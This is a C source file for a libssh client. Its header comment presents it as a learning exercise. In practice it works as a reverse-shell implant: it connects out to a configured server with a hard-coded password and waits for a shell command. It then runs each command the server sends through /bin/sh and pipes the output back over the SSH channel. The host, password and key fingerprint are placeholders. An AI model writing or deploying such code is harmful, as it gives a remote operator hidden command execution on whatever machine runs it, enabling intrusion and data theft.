/*
    A simple libssh client created to familiarize myself with the
    secure shell protocol and the libssh library. Currently the
    client only implements opening a shell command channel, 
    receiving user commands, and sending the results to the server.

    Resources used: 
        http://api.libssh.org/master/index.html
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/wait.h>
#include <libssh/libssh.h>
#include "libssh_config.h"


// Verify host ssh server's public key
int verify_server(ssh_session session)
{
	ssh_key server_key;
	unsigned char *hash;
	size_t hlen;
	char *host_pubkey = "00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00";
	char *hex_key;

	ssh_get_publickey(session, &server_key);
	ssh_get_publickey_hash(server_key, HASH_SHA1, &hash, &hlen);
	//ssh_print_hexa("Public Key: ", hash, hlen);
	hex_key = ssh_get_hexa(hash, hlen);
	if (strcmp(hex_key, host_pubkey) == 0)
		return 0;
	else
		return 1;
}

// Open shell channel with server
void start_client_shell(ssh_session session)
{
	char cmd_buffer[1024];
	int pipefd[2];
	pid_t cpid;
	char result_buffer[1024];
	int rc;
	
	ssh_channel shell_channel = ssh_channel_new(session);


	if (shell_channel == NULL)
		print_error("Failed creating shell channel", session);


	rc = ssh_channel_open_session(shell_channel);

	if(rc != SSH_OK)
		print_error("Failed connecting shell channel", session);


	puts("[*] Opened shell channel!");

	
	memset(cmd_buffer, 0, sizeof(cmd_buffer));			

	// Read shell command from channel
	while(ssh_channel_read(shell_channel, cmd_buffer, sizeof(cmd_buffer), 0) > 0)
	{
		/*
			Open pipe, redirect standard input, output, and error to child pipe, 
			and execute shell command in child. Receive result in parent and send
			through channel to server.
		*/
		if (pipe(pipefd) == -1) 
		{
		   perror("pipe");
		   exit(EXIT_FAILURE);
		}

		cpid = fork();
		if (cpid == -1) 
		{
		   perror("fork");
		   exit(EXIT_FAILURE);
		}

		if (cpid == 0) {
			close(pipefd[0]);
			dup2(pipefd[1], 0);
			dup2(pipefd[1], 1);
			dup2(pipefd[1], 2);

			char filename[] = "/bin/sh\x00";
			char *argv2[] = {filename, "-c", cmd_buffer, 0};
			char *envp[] = {0};

			execve(filename, argv2, envp);
			
			_exit(EXIT_SUCCESS);

		} 
		else 
		{
			close(pipefd[1]);          
			int loop = 1;
			
		   	while (loop)
		   	{
				memset(result_buffer, 0, sizeof(result_buffer));
		   		if(read(pipefd[0], result_buffer, sizeof(result_buffer)) > 0)
		       		ssh_channel_write(shell_channel, result_buffer, sizeof(result_buffer));
		       	else
		       		loop = 0;
		   	}

		   	ssh_channel_write(shell_channel, end_of_data, strlen(end_of_data));

		   close(pipefd[0]);
		   wait(NULL);
		}

		memset(cmd_buffer, 0, sizeof(cmd_buffer));			
	}

	puts("[*] Closing shell channel.");
    ssh_channel_free(shell_channel);
}


int main()
{
	int rc;
	char *password = "password";
	char *host_ip = "0.0.0.0";
	int port = 9999;

	ssh_session session = ssh_new();
	if (session == NULL)
		print_error("Failed creating new session", session);

	ssh_options_set(session, SSH_OPTIONS_HOST, host_ip);
	ssh_options_set(session, SSH_OPTIONS_PORT, &port);
	ssh_options_set(session, SSH_OPTIONS_USER, "libssh_user");

	rc = ssh_connect(session);
	if (rc != SSH_OK)
		print_error("Failed connecting to session", session);

	puts ("[*] Connected to server!");
	//print_pubkey(session);


	if (verify_server(session) != 0)
		print_error("Failed verifying host", session);

	puts("[*] Verified server!");


	rc = ssh_userauth_password(session, NULL, password);
	if (rc != SSH_AUTH_SUCCESS)
		print_error("Failed authenticating to host", session);	

	puts("[*] Authenticated!");


	ssh_channel command_channel = ssh_channel_new(session);
	if (command_channel == NULL)
		print_error("Failed creating channel", session);

	rc = ssh_channel_open_session(command_channel);
	if(rc != SSH_OK)
		print_error("Failed connecting channel", session);

	puts("[*] Opened command channel!");


	int command;
	ssh_channel_read(command_channel, &command, sizeof(command), 0);

	if(command == CMD_SHELL)
	{
		puts("[*] Received Command: Shell Channel");
		start_client_shell(session);
	}
	else
		puts("[*] Invalid command");


    puts("[*] Exiting.");

	ssh_channel_free(command_channel);
	ssh_disconnect(session);
	ssh_free(session);
	return 0;
}